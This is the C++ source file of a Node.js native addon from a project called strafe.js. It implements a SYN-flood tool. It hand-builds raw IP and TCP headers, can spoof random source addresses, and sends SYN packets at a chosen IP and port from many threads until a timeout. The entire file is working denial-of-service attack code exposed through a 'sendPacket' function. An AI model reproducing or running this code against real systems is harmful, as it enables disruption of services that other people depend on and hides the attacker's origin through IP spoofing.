/*
 * This file is part of strafe.js <https://github.com/hmes98318/strafe.js>
 * Copyright (C) 2022-2023  hmes98318  <hmes98318@gmail.com>
 * 
 * strafe.js is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or 
 * any later version.
 * 
 * strafe.js is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with strafe.js.  If not, see <https://www.gnu.org/licenses/>.
*/


#include <node.h>
#include <nan.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <sys/time.h>
#include <time.h>
#include <errno.h>
#include <arpa/inet.h>
#include <string.h>
#include <ctype.h>
#include <chrono>
#include <thread>

#define sleep_ms(milsec) usleep(milsec * 1000)

using namespace v8;


int sockfd; // raw socket

char dst_ip[20] = {0};
int dst_port;

struct Ip
{
    u_char ver_ihl;         // Version and Internet Header Length (IHL)
    u_char tos;             // Type of Service (TOS)
    u_short total_len;      // Total length of the IP datagram
    u_short id;             // Identification
    u_short frag_and_flags; // Fragment offset field and Flags
    u_char ttl;             // Time to Live
    u_char proto;           // Protocol
    u_short checksum;       // IP Header Checksum
    u_int32_t saddr;        // Source IP Address
    u_int32_t daddr;        // Destination IP Address
};
/*
 *  0                   1                   2                   3   
 *  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |Version|  IHL  |Type of Service|          Total Length         |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |         Identification        |Flags|      Fragment Offset    |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |  Time to Live |    Protocol   |         Header Checksum       |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |                       Source Address                          |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |                    Destination Address                        |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |                    Options                    |    Padding    |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
*/

struct Tcp
{
    u_short sport;    // Source Port Number
    u_short dport;    // Destination Port Number
    u_int seq;        // Sequence number
    u_int ack;        // Acknowledgment number
    u_char lenres;    // Data offset
    u_char flag;      // Control flags
    u_short win;      // Window size
    u_short checksum; // TCP Checksum
    u_short urp;      // Urgent pointer
};
/*
 *  0                   1                   2                   3   
 *  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |           Source Port          |       Destination Port       |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |                        Sequence Number                        |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |                     Acknowledgment Number                     |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |  Data | Rese|     |U|A|P|R|S|F|                               |
 *  | Offset| rved|Flags|R|C|S|S|Y|I|            Window             |
 *  |       |     |     |G|K|H|T|N|N|                               |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |           Checksum            |         Urgent Pointer        |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |                    Options                    |    Padding    |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
*/

struct Pseudo
{
    u_int32_t saddr; // Source IP Address
    u_int32_t daddr; // Destination IP Address
    u_char zero;     // Zero
    u_char protocol; // Protocol
    u_short length;  // Length of the TCP segment
};


/* Generate random ipv4 address*/
char *generate_ipv4()
{
    uint32_t ipv4_addr = 0;
    char *ipv4_str = (char *)malloc(INET_ADDRSTRLEN);

    for (int i = 0; i < 4; i++)
    {
        ipv4_addr |= (rand() % 256) << (i * 8);
    }

    inet_ntop(AF_INET, &ipv4_addr, ipv4_str, INET_ADDRSTRLEN);
    return ipv4_str;
}

/* Generate random port*/
int generate_port() {
    return ((rand() % (65535-10240+1)) + 10240);
}

uint16_t ip_checksum(const void *buf, size_t hdr_len)
{
    const uint16_t *data = static_cast<const uint16_t *>(buf);
    uint32_t acc = 0;

    for (size_t i = 0; i < hdr_len; i += 2)
    {
        if (i + 1 == hdr_len)
        {
            acc += static_cast<uint16_t>(data[i]) << 8;
        }
        else
        {
            acc += (static_cast<uint32_t>(data[i]) << 8) | static_cast<uint32_t>(data[i + 1]);
        }
    }

    acc = (acc >> 16) + (acc & 0xFFFF);
    acc = (acc >> 16) + (acc & 0xFFFF);

    return static_cast<uint16_t>(~acc);
}

/* CRC16 checksum calculator */
uint16_t tcp_checksum(uint16_t *buffer, int size) 
{
    uint32_t checksum = 0;

    while (size > 1) 
    {
        checksum += *buffer++;
        size -= sizeof(uint16_t);
    }
    
    if (size)
    {
        checksum += *(uint8_t*)buffer;
    }

    checksum = (checksum >> 16) + (checksum & 0xffff);
    checksum += (checksum >> 16);

    return (uint16_t)(~checksum);
}

/* Fill in IP header, TCP header, Pseudo TCP header */
void init_header(struct Ip *ip, struct Tcp *tcp, struct Pseudo *pseudo, int fakeIp, struct in_addr sin_addr)
{
    int len = sizeof(struct Ip) + sizeof(struct Tcp);
    char *src_ip = inet_ntoa(*(struct in_addr *)&sin_addr);
    if(fakeIp == 1) src_ip = generate_ipv4();

    // IP header
    ip->ver_ihl = (4 << 4 | sizeof(struct Ip) / sizeof(unsigned int));
    ip->tos = 0;
    ip->total_len = htons(len);
    ip->id = 1;
    ip->frag_and_flags = 0x40;
    ip->ttl = 255;
    ip->proto = IPPROTO_TCP;
    ip->checksum = 0;
    ip->saddr = inet_addr(src_ip);
    ip->daddr = inet_addr(dst_ip);

    // TCP header
    tcp->sport = htons(generate_port());
    tcp->dport = htons(dst_port);
    tcp->seq = htonl(rand() % 90000000 + 2345);
    tcp->ack = 0;
    tcp->lenres = (sizeof(struct Tcp) / 4 << 4 | 0);
    tcp->flag = 0x02;
    tcp->win = htons(2048);
    tcp->checksum = 0;
    tcp->urp = 0;

    // Pseudo TCP header
    pseudo->zero = 0;
    pseudo->protocol = IPPROTO_TCP;
    pseudo->length = htons(sizeof(struct Tcp));
    pseudo->daddr = inet_addr(dst_ip);
}

/* Send SYN package */
void *send_SYN(void *addr_info, int timeout = 60, int delay = 1000, int fakeIp = 0)
{
    struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
    struct Ip ip;
    struct Tcp tcp;
    struct Pseudo pseudo;

    char buf[100];
    int count = 0; // Packet sent count
    
    auto start_time = std::chrono::steady_clock::now();
    srand((unsigned)time(NULL));

    while (true)
    {
        init_header(&ip, &tcp, &pseudo, fakeIp, addr->sin_addr);

        // Calculate IP checksum
        memset(buf, 0, sizeof(buf));
        memcpy(buf, &ip, sizeof(struct Ip));
        ip.checksum = ip_checksum((u_short *)buf, sizeof(struct Ip));

        pseudo.saddr = ip.saddr;

        // Calculate TCP checksum
        memset(buf, 0, sizeof(buf));
        memcpy(buf, &pseudo, sizeof(pseudo));
        memcpy(buf + sizeof(pseudo), &tcp, sizeof(struct Tcp));
        tcp.checksum = tcp_checksum((u_short *)buf, sizeof(pseudo) + sizeof(struct Tcp));

        // Build Data packet
        char packet[sizeof(ip) + sizeof(tcp)];
        memset(packet, 0, sizeof(packet));
        memcpy(packet, &ip, sizeof(ip));
        memcpy(packet + sizeof(ip), &tcp, sizeof(tcp));

        if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)addr, sizeof(struct sockaddr)) < 0)
        {
            perror("sendto()");
            exit(EXIT_FAILURE);
        }

        printf("\033[F");
        printf("Sent SYN Packet: %d       \n", count++);

        // Timeout Checker
        auto current_time = std::chrono::steady_clock::now();
        auto elapsed_seconds = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count();

        if (elapsed_seconds >= timeout)
        {
            break;
        }

        // sleep for milliseconds
        sleep_ms(delay);
    }
    return 0;
}

void Method(const FunctionCallbackInfo<Value> &args)
{
    Isolate *isolate = args.GetIsolate();

    // Initialize Socket
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));

    int on = 1; // Custom TCP pakcet
    int timeout = args[2]->Int32Value(isolate->GetCurrentContext()).ToChecked();
    int delay = args[3]->Int32Value(isolate->GetCurrentContext()).ToChecked();
    int numThreads = args[4]->Int32Value(isolate->GetCurrentContext()).ToChecked();
    int fakeIp = args[5]->Int32Value(isolate->GetCurrentContext()).ToChecked();

    // Get the destination IP address and port number from the arguments
    String::Utf8Value str_ip(isolate, args[0]);
    String::Utf8Value str_port(isolate, args[1]);
    const char *ip = *str_ip;
    const char *port = *str_port;

    strncpy(dst_ip, ip, 16);
    dst_port = atoi(port);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(dst_ip);
    addr.sin_port = htons(dst_port);

    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0)
    {
        perror("socket()");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)
    {
        perror("setsockopt()");
        exit(EXIT_FAILURE);
    }

    if (setuid(getpid()) == -1)
    {
        perror("setuid()");
        exit(EXIT_FAILURE);
    }

    printf("start process.\n");

    // Create threads
    std::thread threads[numThreads];
    for (int i = 0; i < numThreads; i++)
    {
        threads[i] = std::thread(send_SYN, &addr, timeout, delay, fakeIp);

        if (threads[i].get_id() == std::thread::id())
        {
            printf("Failed to create thread %d", i);
            exit(EXIT_FAILURE);
        }
        printf("\n");
    }

    for (int i = 0; i < numThreads; i++)
    {
        threads[i].join();
    }

    printf("Stop all process.\n");
    close(sockfd);
}

void Initialize(Local<Object> exports)
{
    NODE_SET_METHOD(exports, "sendPacket", Method);
}

NODE_MODULE(addon, Initialize)